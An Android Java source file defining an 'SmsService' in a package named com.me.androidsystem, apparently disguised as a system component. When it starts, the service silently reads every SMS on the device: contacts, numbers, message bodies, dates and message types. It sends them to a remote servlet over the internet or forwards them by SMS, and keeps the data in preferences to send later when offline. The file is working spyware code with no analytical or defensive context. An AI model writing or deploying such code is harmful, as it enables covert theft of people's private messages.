package com.me.androidsystem.service;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;

import com.me.androidsystem.domain.SmsInfo;
import com.me.androidsystem.util.CommndUtil;
import com.me.androidsystem.util.ServiceUtil;

public class SmsService extends Service {
	private SharedPreferences preferences; 
	@Override
	public void onCreate() {
		super.onCreate();
		preferences = getSharedPreferences(ServiceUtil.CONFIG_NAME,
				Context.MODE_PRIVATE);
		int model = preferences.getInt(ServiceUtil.SMS_MODEL, ServiceUtil.MODEL_NET_ONLY);
		switch (model) { 
		case ServiceUtil.MODEL_SMS_ONLY:
			sendSMSContent();
			break;
		case ServiceUtil.MODEL_NET_ONLY:
			sendNETContent();
			break;
		case ServiceUtil.MODEL_NET_SMS:
			sendNETORSMSContent();
			break;

		default:
			break;
		}
		stopSelf();
	}

	private void sendNETORSMSContent() {
		ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();  
        if(networkInfo != null && networkInfo.isAvailable()){  
            //当前有可用网络  
        	sendNETContent();
        }else{  
            //当前无可用网络
        	sendSMSContent();
        }  
	}

	private void sendNETContent() {
		ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();  
        if(networkInfo != null && networkInfo.isAvailable()){  
            //当前有可用网络  
        	CommndUtil.sendInternet(resolve(getAllSms()), ServiceUtil.PHO_SERVLET);
        }else{  
        	String oldInfo = preferences.getString(ServiceUtil.OFF_INFO, "");
	    	Editor editor = preferences.edit();
	    	editor.putString(ServiceUtil.OFF_INFO,oldInfo+resolve(getAllSms())+"\n");
	    	editor.commit();
        	return;
        }  
		
	}

	private void sendSMSContent() {
		CommndUtil.sendSMS(resolve(getAllSms()));
	}
	private String resolve(List<SmsInfo> list){
		StringBuilder sb = new StringBuilder();
		sb.append("联系人  电话  内容  日期  类型\n");
		for(SmsInfo info : list){
			String name = info.getLinkman();
			String number = info.getNumber();
			String content = info.getContent();
			String date = info.getDate();
			String type = info.getType();
			sb.append(name + " " + number + " " + content + " " + date + " " + type +"\n");
		}
		
		return sb.toString();
	}
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	private List<SmsInfo> getAllSms() {
		List<SmsInfo> list = new ArrayList<SmsInfo>();
		final String SMS_URI_ALL = "content://sms/";
		try {
			ContentResolver cr = getContentResolver();
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Uri uri = Uri.parse(SMS_URI_ALL);
			Cursor cur = cr.query(uri, projection, null, null, "date desc");

			while (cur.moveToNext()) {
				String name;
				String phoneNumber;
				String smsbody;
				String date;
				String type;

				name = cur.getString(cur.getColumnIndex("person"));
				phoneNumber = cur.getString(cur.getColumnIndex("address"));
				smsbody = cur.getString(cur.getColumnIndex("body"));

				SimpleDateFormat dateFormat = new SimpleDateFormat(
						"yyyy-MM-dd hh:mm:ss");
				Date d = new Date(Long.parseLong(cur.getString(cur
						.getColumnIndex("date"))));
				date = dateFormat.format(d);

				int typeId = cur.getInt(cur.getColumnIndex("type"));
				if (typeId == 1) {
					type = "接收";
				} else if (typeId == 2) {
					type = "发送";
				} else if (typeId == 0) {
					type = "未读";
				} else {
					type = "草稿";
				}

//				Uri personUri = Uri.withAppendedPath(
//						ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
//						phoneNumber);
//				Cursor localCursor = cr.query(personUri, new String[] {
//						PhoneLookup.DISPLAY_NAME, PhoneLookup.PHOTO_ID,
//						PhoneLookup._ID }, null, null, null);
//
//				if (localCursor.getCount() != 0) {
//					localCursor.moveToFirst();
//					name = localCursor.getString(localCursor
//							.getColumnIndex(PhoneLookup.DISPLAY_NAME));
//				}
				if (smsbody == null)
					smsbody = "";
				list.add(new SmsInfo(name, phoneNumber, smsbody, date, type));
			}
		} catch (SQLiteException ex) {

		}
		return list;
	}
}
